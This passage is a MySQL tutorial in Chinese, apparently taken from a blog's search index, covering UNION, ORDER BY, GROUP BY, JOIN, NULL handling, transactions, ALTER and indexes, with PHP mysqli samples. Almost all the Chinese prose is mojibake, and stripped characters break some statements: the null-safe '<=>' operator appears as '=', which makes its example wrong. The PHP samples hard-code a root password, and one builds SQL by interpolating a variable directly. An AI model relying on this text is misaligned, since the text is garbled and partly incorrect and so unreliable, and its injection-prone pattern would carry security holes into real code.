border=1trtdæ•™ç¨‹ ID/tdtdæ ‡é¢˜/tdtdä½œè€…/tdtdæäº¤æ—¥æœŸ/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;echo /table;mysqli_close($conn);? MySQL UNION æ“ä½œç¬¦ MySQL UNION æ“ä½œç¬¦ç”¨äºè¿æ¥ä¸¤ä¸ªä»¥ä¸Šçš„ SELECT è¯­å¥çš„ç»“æœç»„åˆåˆ°ä¸€ä¸ªç»“æœé›†åˆï¼Œå¹¶å»é™¤é‡å¤çš„è¡Œ(ä»è¡¨ä¸­é€‰å–æ‰€æœ‰ä¸åŒå€¼ç»„åˆåœ¨ä¸€èµ·) UNION æ“ä½œç¬¦å¿…é¡»ç”±ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥ç»„æˆï¼Œæ¯ä¸ª SELECT è¯­å¥çš„åˆ—æ•°å’Œå¯¹åº”ä½ç½®çš„æ•°æ®ç±»å‹å¿…é¡»ç›¸åŒ SELECT column1, column2, ...FROM table1WHERE condition1UNIONSELECT column1, column2, ...FROM table2WHERE condition2[ORDER BY column1, column2, ...]; ORDER BY å­å¥æ˜¯ä¸€ä¸ªå¯é€‰çš„å­å¥ï¼Œç”¨äºæŒ‡å®šåˆå¹¶åçš„ç»“æœé›†çš„æ’åºé¡ºåº ä½¿ç”¨ UNION ALL ä¸å»é™¤é‡å¤è¡Œ MySQL ORDER BY(æ’åº) è¯­å¥ MySQL ORDER BY(æ’åº) è¯­å¥å¯ä»¥æŒ‰ç…§ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—çš„å€¼è¿›è¡Œå‡åºï¼ˆASCï¼‰æˆ–é™åºï¼ˆDESCï¼‰æ’åº SELECT column1, column2, ...FROM table_nameORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...; å¯ä»¥ä½¿ç”¨ NULLS FIRST æˆ– NULLS LAST å¤„ç† NULL å€¼ åœ¨å‘½ä»¤æç¤ºç¬¦ä¸­ä½¿ç”¨ ORDER BY å­å¥ SELECT * from runoob_tbl ORDER BY submission_date ASC; è¯»å– runoob_tbl è¡¨ä¸­æ‰€æœ‰æ•°æ®å¹¶æŒ‰ submission_date å­—æ®µçš„å‡åºæ’åˆ— åœ¨ PHP è„šæœ¬ä¸­ä½¿ç”¨ ORDER BY å­å¥ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl ORDER BY submission_date ASC; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•è¯»å–æ•°æ®: . mysqli_error($conn));echo h2èœé¸Ÿæ•™ç¨‹ MySQL ORDER BY æµ‹è¯•h2;echo table border=1trtdæ•™ç¨‹ ID/tdtdæ ‡é¢˜/tdtdä½œè€…/tdtdæäº¤æ—¥æœŸ/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;echo /table;mysqli_close($conn);? MySQL GROUP BY è¯­å¥ GROUP BY è¯­å¥æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„ã€‚ åœ¨åˆ†ç»„çš„åˆ—ä¸Šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ COUNT, SUM, AVG,ç­‰å‡½æ•°ã€‚ SELECT column1, aggregate_function(column2)FROM table_nameWHERE conditionGROUP BY column1; column1ï¼šæŒ‡å®šåˆ†ç»„çš„åˆ—ã€‚ aggregate_function(column2)ï¼šå¯¹åˆ†ç»„åçš„æ¯ä¸ªç»„æ‰§è¡Œçš„èšåˆå‡½æ•°ã€‚ table_nameï¼šè¦æŸ¥è¯¢çš„è¡¨åã€‚ conditionï¼šå¯é€‰ï¼Œç”¨äºç­›é€‰ç»“æœçš„æ¡ä»¶ã€‚ SET NAMES utf8;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for `employee_tbl`-- ----------------------------DROP TABLE IF EXISTS `employee_tbl`;CREATE TABLE `employee_tbl` ( `id` INT(11) NOT NULL, `name` CHAR(10) NOT NULL DEFAULT , `date` datetime NOT NULL, `signin` tinyint(4) NOT NULL DEFAULT 0 COMMENT ç™»å½•æ¬¡æ•°, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;-- ------------------------------ Records of `employee_tbl`-- ----------------------------BEGIN;INSERT INTO `employee_tbl` VALUES (1, å°æ˜, 2016-04-22 15:25:33, 1), (2, å°ç‹, 2016-04-20 15:25:47, 3), (3, å°ä¸½, 2016-04-19 15:26:02, 2), (4, å°ç‹, 2016-04-07 15:26:14, 4), (5, å°æ˜, 2016-04-11 15:26:40, 4), (6, å°æ˜, 2016-04-04 15:26:54, 2);COMMIT;SET FOREIGN_KEY_CHECKS = 1; å¯¼å…¥æˆåŠŸåï¼Œæ‰§è¡Œä»¥ä¸‹ SQL è¯­å¥ï¼š mysql set names utf8;mysql SELECT * FROM employee_tbl;+----+--------+---------------------+--------+| id | name | date | signin |+----+--------+---------------------+--------+| 1 | å°æ˜ | 2016-04-22 15:25:33 | 1 || 2 | å°ç‹ | 2016-04-20 15:25:47 | 3 || 3 | å°ä¸½ | 2016-04-19 15:26:02 | 2 || 4 | å°ç‹ | 2016-04-07 15:26:14 | 4 || 5 | å°æ˜ | 2016-04-11 15:26:40 | 4 || 6 | å°æ˜ | 2016-04-04 15:26:54 | 2 |+----+--------+---------------------+--------+6 rows in set (0.00 sec) ä½¿ç”¨ GROUP BY è¯­å¥ å°†æ•°æ®è¡¨æŒ‰åå­—è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡æ¯ä¸ªäººæœ‰å¤šå°‘æ¡è®°å½•ï¼š mysql SELECT name, COUNT(*) FROM employee_tbl GROUP BY name;+--------+----------+| name | COUNT(*) |+--------+----------+| å°ä¸½ | 1 || å°æ˜ | 3 || å°ç‹ | 2 |+--------+----------+3 rows in set (0.01 sec) WITH ROLLUP å¯ä»¥å®ç°åœ¨åˆ†ç»„ç»Ÿè®¡æ•°æ®åŸºç¡€ä¸Šå†è¿›è¡Œç›¸åŒçš„ç»Ÿè®¡ï¼ˆSUM,AVG,COUNTâ€¦ï¼‰ã€‚ ä¾‹å¦‚æˆ‘ä»¬å°†ä»¥ä¸Šçš„æ•°æ®è¡¨æŒ‰åå­—è¿›è¡Œåˆ†ç»„ï¼Œå†ç»Ÿè®¡æ¯ä¸ªäººç™»å½•çš„æ¬¡æ•°ï¼š mysql SELECT name, SUM(signin) as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP;+--------+--------------+| name | signin_count |+--------+--------------+| å°ä¸½ | 2 || å°æ˜ | 7 || å°ç‹ | 7 || NULL | 16 |+--------+--------------+4 rows in set (0.00 sec) å…¶ä¸­è®°å½• NULL è¡¨ç¤ºæ‰€æœ‰äººçš„ç™»å½•æ¬¡æ•°ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ coalesce æ¥è®¾ç½®ä¸€ä¸ªå¯ä»¥å–ä»£ NUll çš„åç§°ï¼Œcoalesce è¯­æ³•ï¼š æœ anullï¼Œåˆ™é€‰æ‹© bï¼›å¦‚æœ bnull,åˆ™é€‰æ‹© cï¼›å¦‚æœ a!=null,åˆ™é€‰æ‹© aï¼›å¦‚æœ a b c éƒ½ä¸º null ï¼Œåˆ™è¿”å›ä¸º nullï¼ˆæ²¡æ„ä¹‰ï¼‰ select coalesce(a,b,c); mysql SELECT coalesce(name, æ€»æ•°), SUM(signin) as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP;+--------------------------+--------------+| coalesce(name, æ€»æ•°) | signin_count |+--------------------------+--------------+| å°ä¸½ | 2 || å°æ˜ | 7 || å°ç‹ | 7 || æ€»æ•° | 16 |+--------------------------+--------------+4 rows in set (0.01 sec) MySQL è¿æ¥çš„ä½¿ç”¨ ä½¿ç”¨ MySQL çš„ JOIN åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨ä¸­æŸ¥è¯¢æ•°æ® JOIN æŒ‰åŠŸèƒ½åˆ†ç±» INNER JOIN è¿”å›ä¸¤ä¸ªè¡¨ä¸­æ»¡è¶³è¿æ¥æ¡ä»¶çš„åŒ¹é…è¡Œ SELECT column1, column2, ...FROM table1INNER JOIN table2 ON table1.column_name = table2.column_name; table1.column_name = table2.column_name æ˜¯è¿æ¥æ¡ä»¶ï¼ŒæŒ‡å®šäº†ä¸¤ä¸ªè¡¨ä¸­ç”¨äºåŒ¹é…çš„åˆ— LEFT JOIN è¿”å›å·¦è¡¨çš„æ‰€æœ‰è¡Œï¼Œå¹¶åŒ…æ‹¬å³è¡¨ä¸­åŒ¹é…çš„è¡Œ SELECT column1, column2, ...FROM table1LEFT JOIN table2 ON table1.column_name = table2.column_name; RIGHT JOIN è¿”å›å³è¡¨çš„æ‰€æœ‰è¡Œï¼Œå¹¶åŒ…æ‹¬å·¦è¡¨ä¸­åŒ¹é…çš„è¡Œ SELECT column1, column2, ...FROM table1RIGHT JOIN table2 ON table1.column_name = table2.column_name; åœ¨å‘½ä»¤æç¤ºç¬¦ä¸­ä½¿ç”¨ INNER JOIN å¦‚åœ¨ RUNOOB æ•°æ®åº“ä¸­æœ‰ä¸¤å¼ è¡¨ tcount_tbl å’Œ runoob_tbl SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; æˆ– SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a, tcount_tbl b WHERE a.runoob_author = b.runoob_author; åœ¨ PHP è„šæœ¬ä¸­ä½¿ç”¨ JOIN ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $sql = SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•è¯»å–æ•°æ®: . mysqli_error($conn));echo h2èœé¸Ÿæ•™ç¨‹ MySQL JOIN æµ‹è¯•h2;echo table border=1trtdæ•™ç¨‹ ID/tdtdä½œè€…/tdtdç™»é™†æ¬¡æ•°/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_author] /td . td$row[runoob_count] /td . /tr;echo /table;mysqli_close($conn);? MySQL NULL å€¼å¤„ç† IS NULL: å½“åˆ—çš„å€¼æ˜¯ NULL,æ­¤è¿ç®—ç¬¦è¿”å› trueã€‚ IS NOT NULL: å½“åˆ—çš„å€¼ä¸ä¸º NULL, è¿ç®—ç¬¦è¿”å› trueã€‚ =: æ¯”è¾ƒæ“ä½œç¬¦ï¼ˆä¸åŒäº = è¿ç®—ç¬¦ï¼‰ï¼Œå½“æ¯”è¾ƒçš„çš„ä¸¤ä¸ªå€¼ç›¸ç­‰æˆ–è€…éƒ½ä¸º NULL æ—¶è¿”å› trueã€‚ æ£€æŸ¥æ˜¯å¦ä¸º NULL SELECT * FROM è¡¨å WHERE é”®å IS NULL;SELECT * FROM è¡¨å WHERE é”®å IS NOT NULL; å¤„ç†NULL COALESCE() å‡½æ•° è¿”å›å‚æ•°ä¸­çš„ç¬¬ä¸€ä¸ªé NULL å€¼ SELECT name, COALESCE(age, 0) AS age FROM users; IFNULL() å‡½æ•° å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°ä¸º NULLï¼Œè¿”å›ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦åˆ™è¿”å›ç¬¬ä¸€ä¸ªå‚æ•° SELECT name, IFNULL(age, 18) AS age FROM users; NULLIF() å‡½æ•° æ¯”è¾ƒä¸¤ä¸ªå‚æ•°ï¼Œå¦‚æœå®ƒä»¬ç›¸ç­‰åˆ™è¿”å› NULLï¼Œå¦åˆ™è¿”å›ç¬¬ä¸€ä¸ªå‚æ•° SELECT NULLIF(5, 5); -- è¿”å› NULLSELECT NULLIF(5, 10); -- è¿”å› 5 èšåˆå‡½æ•°çš„å¤„ç† COUNT(column)ï¼šå¿½ç•¥ NULL å€¼ï¼Œåªç»Ÿè®¡é NULL å€¼çš„è¡Œã€‚ COUNT(\\*)ï¼šç»Ÿè®¡æ‰€æœ‰è¡Œï¼ŒåŒ…æ‹¬ NULLã€‚ SUM()ã€AVG() ç­‰ï¼šä¼šå¿½ç•¥ NULL å€¼ï¼Œåªè®¡ç®—é NULL å€¼ã€‚ SELECT COUNT(age) AS count_age, COUNT(*) AS count_all FROM users; NULL æ’åº åœ¨ä½¿ç”¨ ORDER BY å­å¥è¿›è¡Œæ’åºæ—¶ï¼ŒNULL å€¼é»˜è®¤ä¼šè¢«æ”¾åœ¨æ’åºçš„æœ€åã€‚å¦‚æœå¸Œæœ›å°† NULL å€¼æ”¾åœ¨æœ€å‰é¢ï¼Œå¯ä»¥ä½¿ç”¨ ORDER BY column_name ASC NULLS FIRSTï¼Œåä¹‹ä½¿ç”¨ ORDER BY column_name DESC NULLS LAST ä½¿ç”¨ = æ“ä½œç¬¦è¿›è¡Œ NULL æ¯”è¾ƒ = æ“ä½œç¬¦æ˜¯ MySQL ä¸­ç”¨äºæ¯”è¾ƒä¸¤ä¸ªè¡¨è¾¾å¼æ˜¯å¦ç›¸ç­‰çš„ç‰¹æ®Šæ“ä½œç¬¦ SELECT * FROM employees WHERE commission = NULL; ä½¿ç”¨ PHP è„šæœ¬å¤„ç† NULL å€¼ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); if( isset($runoob_count )) $sql = SELECT runoob_author, runoob_count FROM runoob_test_tbl WHERE runoob_count = $runoob_count;else $sql = SELECT runoob_author, runoob_count FROM runoob_test_tbl WHERE runoob_count IS NULL;mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•è¯»å–æ•°æ®: . mysqli_error($conn));echo h2èœé¸Ÿæ•™ç¨‹ IS NULL æµ‹è¯•h2;echo table border=1trtdä½œè€…/tdtdç™»é™†æ¬¡æ•°/td/tr;while($row = mysqli_fetch_array($retval, MYSQL_ASSOC)) echo tr. td$row[runoob_author] /td . td$row[runoob_count] /td . /tr;echo /table;mysqli_close($conn);? MySQL æ­£åˆ™è¡¨è¾¾å¼ MySQL ä¸­ä½¿ç”¨ REGEXP å’Œ RLIKEæ“ä½œç¬¦æ¥è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… SELECT column1, column2, ...FROM table_nameWHERE column_name REGEXP pattern; column1, column2, â€¦ æ˜¯ä½ è¦é€‰æ‹©çš„åˆ—çš„åç§°ï¼Œå¦‚æœä½¿ç”¨ * è¡¨ç¤ºé€‰æ‹©æ‰€æœ‰åˆ—ã€‚ table_name æ˜¯ä½ è¦ä»ä¸­æŸ¥è¯¢æ•°æ®çš„è¡¨çš„åç§°ã€‚ column_name æ˜¯ä½ è¦è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„åˆ—çš„åç§°ã€‚ 'pattern' æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚ \\wï¼šåŒ¹é…ä¸€ä¸ªå­—æ¯æ•°å­—å­—ç¬¦ï¼ˆåŒ…æ‹¬ä¸‹åˆ’çº¿ï¼‰ã€‚ \\sï¼šåŒ¹é…ä¸€ä¸ªç©ºç™½å­—ç¬¦ MySQL äº‹åŠ¡ äº‹åŠ¡æ˜¯ä¸€ç»„SQLè¯­å¥çš„æ‰§è¡Œï¼Œå®ƒä»¬è¢«è§†ä¸ºä¸€ä¸ªå•ç‹¬çš„å·¥ä½œå•å…ƒ äº‹åŠ¡æ˜¯å¿…é¡»æ»¡è¶³4ä¸ªæ¡ä»¶ï¼ˆACIDï¼‰ï¼š åŸå­æ€§ï¼ˆAtomicityï¼Œæˆ–ç§°ä¸å¯åˆ†å‰²æ€§ï¼‰ï¼šä¸€ä¸ªäº‹åŠ¡ï¼ˆtransactionï¼‰ä¸­çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆ ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šåœ¨äº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä»¥åï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§æ²¡æœ‰è¢«ç ´å éš”ç¦»æ€§ï¼ˆIsolationï¼Œåˆç§°ç‹¬ç«‹æ€§ï¼‰ï¼šæ•°æ®åº“å…è®¸å¤šä¸ªå¹¶å‘äº‹åŠ¡åŒæ—¶å¯¹å…¶æ•°æ®è¿›è¡Œè¯»å†™å’Œä¿®æ”¹çš„èƒ½åŠ›ï¼Œéš”ç¦»æ€§å¯ä»¥é˜²æ­¢å¤šä¸ªäº‹åŠ¡å¹¶å‘æ‰§è¡Œæ—¶ç”±äºäº¤å‰æ‰§è¡Œè€Œå¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´ æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡å¤„ç†ç»“æŸåï¼Œå¯¹æ•°æ®çš„ä¿®æ”¹å°±æ˜¯æ°¸ä¹…çš„ï¼Œå³ä¾¿ç³»ç»Ÿæ•…éšœä¹Ÿä¸ä¼šä¸¢å¤± mysqläº‹åŠ¡å¤„ç† ç”¨ BEGIN, ROLLBACK, COMMIT BEGIN æˆ– START TRANSACTIONï¼šå¼€ç”¨äºå¼€å§‹ä¸€ä¸ªäº‹åŠ¡ã€‚ ROLLBACK äº‹åŠ¡å›æ»šï¼Œå–æ¶ˆä¹‹å‰çš„æ›´æ”¹ã€‚ COMMITï¼šäº‹åŠ¡ç¡®è®¤ï¼Œæäº¤äº‹åŠ¡ï¼Œä½¿æ›´æ”¹æ°¸ä¹…ç”Ÿæ•ˆã€‚ SAVEPOINTï¼šç”¨äºåœ¨äº‹åŠ¡ä¸­è®¾ç½®ä¿å­˜ç‚¹ï¼Œä»¥ä¾¿ç¨åèƒ½å¤Ÿå›æ»šåˆ°è¯¥ç‚¹ SAVEPOINT savepoint_name; ROLLBACK TO SAVEPOINTï¼šç”¨äºå›æ»šåˆ°ä¹‹å‰è®¾ç½®çš„ä¿å­˜ç‚¹ ROLLBACK TO SAVEPOINT savepoint_name; ç”¨ SET æ¥æ”¹å˜ MySQL çš„è‡ªåŠ¨æäº¤æ¨¡å¼ SET AUTOCOMMIT=0 ç¦æ­¢è‡ªåŠ¨æäº¤ SET AUTOCOMMIT=1 å¼€å¯è‡ªåŠ¨æäº¤ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn, set names utf8);mysqli_select_db( $conn, RUNOOB );mysqli_query($conn, SET AUTOCOMMIT=0); // è®¾ç½®ä¸ºä¸è‡ªåŠ¨æäº¤ï¼Œå› ä¸ºMYSQLé»˜è®¤ç«‹å³æ‰§è¡Œmysqli_begin_transaction($conn); // å¼€å§‹äº‹åŠ¡å®šä¹‰ if(!mysqli_query($conn, insert into runoob_transaction_test (id) values(8))) mysqli_query($conn, ROLLBACK); // åˆ¤æ–­å½“æ‰§è¡Œå¤±è´¥æ—¶å›æ»š if(!mysqli_query($conn, insert into runoob_transaction_test (id) values(9))) mysqli_query($conn, ROLLBACK); // åˆ¤æ–­æ‰§è¡Œå¤±è´¥æ—¶å›æ»šmysqli_commit($conn); //æ‰§è¡Œäº‹åŠ¡mysqli_close($conn);? MySQL ALTER å‘½ä»¤ MySQL çš„ ALTER å‘½ä»¤ç”¨äºä¿®æ”¹æ•°æ®åº“ã€è¡¨å’Œç´¢å¼•ç­‰å¯¹è±¡çš„ç»“æ„ ALTER å‘½ä»¤å…è®¸ä½ æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®åº“å¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥ç”¨äºæ›´æ”¹è¡¨çš„åˆ—å®šä¹‰ã€æ·»åŠ çº¦æŸã€åˆ›å»ºå’Œåˆ é™¤ç´¢å¼•ç­‰æ“ä½œ æ·»åŠ åˆ— ALTER TABLE æ•°æ®è¡¨åADD COLUMN åˆ—å æ–°çš„æ•°æ®ç±»å‹; ALTER TABLE æ•°æ®è¡¨å ADD åˆ—å æ–°çš„æ•°æ®ç±»å‹ FIRST;ALTER TABLE æ•°æ®è¡¨å ADD åˆ—å æ–°çš„æ•°æ®ç±»å‹ AFTER è¡¨ä¸­çš„åˆ—å; ä¿®æ”¹åˆ—çš„æ•°æ®ç±»å‹ ALTER TABLE æ•°æ®è¡¨åMODIFY COLUMN åˆ—å æ–°çš„æ•°æ®ç±»å‹; ä¿®æ”¹åˆ—å ALTER TABLE æ•°æ®è¡¨åCHANGE COLUMN æ—§çš„åˆ—å æ–°çš„åˆ—å æ–°çš„æ•°æ®ç±»å‹; åˆ é™¤åˆ— ALTER TABLE æ•°æ®è¡¨åDROP COLUMN åˆ—å; æ·»åŠ  PRIMARY KEY ALTER TABLE æ•°æ®è¡¨åADD PRIMARY KEY (åˆ—å); æ·»åŠ  FOREIGN KEY ALTER TABLE æ•°æ®å­è¡¨ADD CONSTRAINT åœ¨å­è¡¨ä¸­æ·»åŠ çš„å¤–é”® //ç”¨äºå…³è”åˆ°æ•°æ®æ¯è¡¨çš„åˆ—FOREIGN KEY (æ•°æ®æ¯è¡¨çš„åˆ—å)REFERENCES æ•°æ®æ¯è¡¨ (æ•°æ®æ¯è¡¨çš„åˆ—å); ä¿®æ”¹è¡¨å ALTER TABLE æ—§çš„è¡¨åRENAME TO æ–°çš„è¡¨å; MySQL ç´¢å¼• MySQL ç´¢å¼•æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºåŠ å¿«æ•°æ®åº“æŸ¥è¯¢çš„é€Ÿåº¦å’Œæ€§èƒ½ æ™®é€šç´¢å¼• åˆ›å»ºç´¢å¼• CREATE INDEX index_nameON table_name (column1 [ASC|DESC], column2 [ASC|DESC], ...); ä¿®æ”¹è¡¨ç»“æ„(æ·»åŠ ç´¢å¼•) ALTER TABLE table_nameADD INDEX index_name (column1 [ASC|DESC], column2 [ASC|DESC], ...); åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®š CREATE TABLE table_name ( column1 data_type, column2 data_type, ..., INDEX index_name (column1 [ASC|DESC], column2 [ASC|DESC], ...)); åˆ é™¤ç´¢å¼•çš„è¯­æ³• DROP INDEX index_name ON table_name; ALTER TABLE table_nameDROP INDEX index_name; å”¯ä¸€ç´¢å¼• åˆ›å»ºç´¢å¼• CREATE UNIQUE INDEX index_nameON table_name (column1 [ASC|DESC], column2 [ASC|DESC], ...); ä¿®æ”¹è¡¨ç»“æ„æ·»åŠ ç´¢å¼• ALTER table table_name ADD CONSTRAINT unique_constraint_name UNIQUE (column1, column2, ...); åˆ›å»ºè¡¨çš„æ—¶å€™ç›´æ¥æŒ‡å®š CREATE TABLE table_name ( column1 data_type, column2 data_type, ..., CONSTRAINT index_name UNIQUE (column1 [ASC|DESC], column2 [ASC|DESC], ...)); ä½¿ç”¨ALTER å‘½ä»¤æ·»åŠ å’Œåˆ é™¤ç´¢å¼• ALTER TABLE tbl_name ADD PRIMARY KEY (column_list):è¯¥è¯­å¥æ·»åŠ ä¸€ä¸ªä¸»é”®ï¼Œä¸»é”®åˆ—ä¸­çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä¸»é”®çš„åˆ—çš„åˆ—è¡¨ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ï¼Œä¸èƒ½åŒ…å« NULL å€¼ã€‚ ã€‚ ALTER TABLE tbl_name ADD UNIQUE index_name (column_list): è¿™æ¡è¯­å¥åˆ›å»ºç´¢å¼•çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼ˆé™¤äº†NULLå¤–ï¼ŒNULLå¯èƒ½ä¼šå‡ºç°å¤šæ¬¡ï¼‰ã€‚ ALTER TABLE tbl_name ADD INDEX index_name (column_list): æ·»åŠ æ™®é€šç´¢å¼•ï¼Œç´¢å¼•å€¼å¯å‡ºç°å¤šæ¬¡ã€‚ **ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list)ğŸ˜—*è¯¥è¯­å¥æŒ‡å®šäº†ç´¢å¼•ä¸º FULLTEXT ï¼Œç”¨äºå…¨æ–‡ç´¢å¼•ã€‚ ä½¿ç”¨ ALTER å‘½ä»¤æ·»åŠ å’Œåˆ é™¤ä¸»é”® ä¸»é”®ä½œç”¨äºåˆ—ä¸Šï¼ˆå¯ä»¥ä¸€ä¸ªåˆ—æˆ–å¤šä¸ªåˆ—è”åˆä¸»é”®ï¼‰ï¼Œæ·»åŠ ä¸»é”®æ—¶ï¼Œä½ éœ€è¦ç¡®ä¿è¯¥ä¸»é”®é»˜è®¤ä¸ä¸ºç©ºï¼ˆNOT NULLï¼‰ ALTER TABLE testalter_tbl MODIFY i INT NOT NULL;ALTER TABLE testalter_tbl ADD PRIMARY KEY (i); mysql ALTER TABLE testalter_tbl DROP PRIMARY KEY; åˆ é™¤ä¸»é”®æ—¶åªéœ€æŒ‡å®š PRIMARY KEYï¼Œä½†åœ¨åˆ é™¤ç´¢å¼•æ—¶ï¼Œä½ å¿…é¡»çŸ¥é“ç´¢å¼•å æ˜¾ç¤ºç´¢å¼•ä¿¡æ¯ SHOW INDEX FROM table_name\\G SHOW INDEX: ç”¨äºæ˜¾ç¤ºç´¢å¼•ä¿¡æ¯çš„å…³é”®å­—ã€‚ FROM table_name: æŒ‡å®šè¦æŸ¥çœ‹ç´¢å¼•ä¿¡æ¯çš„è¡¨çš„åç§°ã€‚ \\G: æ ¼å¼åŒ–è¾“å‡ºä¿¡æ¯ã€‚ MySQL ä¸´æ—¶è¡¨ï¼ˆå¾…ï¼‰ MySQL å¤åˆ¶è¡¨ï¼ˆå¾…ï¼‰ MySQL å…ƒæ•°æ®ï¼ˆå¾…ï¼‰ MySQL åºåˆ—ä½¿ç”¨ï¼ˆAUTO_INCREMENTï¼‰ï¼ˆå¾…ï¼‰ MySQL å¤„ç†é‡å¤æ•°æ®ï¼ˆå¾…ï¼‰ MySQL åŠ SQL æ³¨å…¥ SQL æ³¨å…¥ï¼Œå°±æ˜¯é€šè¿‡æŠŠ SQL å‘½ä»¤æ’å…¥åˆ° Web è¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„ SQL å‘½ä»¤ MySQL å¯¼å‡ºæ•°æ®ï¼ˆå¾…ï¼‰ MySQL å¯¼å…¥æ•°æ®ï¼ˆå¾…ï¼‰ MySQL å‡½æ•°ï¼Œè¿ç®—ç¬¦ï¼Œå‘½ä»¤å¤§å…¨ï¼ˆå¾…ï¼‰","tags":["MySQL"],"categories":["æ•°æ®åº“"]},{"title":"MySQL handlerçš„ç”¨æ³•ä¸åº”ç”¨","path":"/2025/07/09/MySQL handlerçš„ç”¨æ³•ä¸åº”ç”¨/","content":"MySQL handlerçš„ç”¨æ³•ä¸åº”ç”¨ handlerçš„ç”¨æ³• HANDLERæ˜¯ä¸€ä¸ªæ¯”è¾ƒä½çº§çš„è¯­å¥ï¼Œå…·æœ‰è‡ªå·±çš„ä¼šè¯æœºåˆ¶ï¼Œä¸”ä¼šè¯å¯¹è±¡ä¸ç”±å…¶ä»–ä¼šè¯å…±äº«ï¼Œä¸”ç›´åˆ°ä¼šè¯è°ƒç”¨ HANDLER... CLOSE æˆ–ä¼šè¯ç»ˆæ­¢æ—¶æ‰å…³é—­ HANDLER tbl_name OPEN 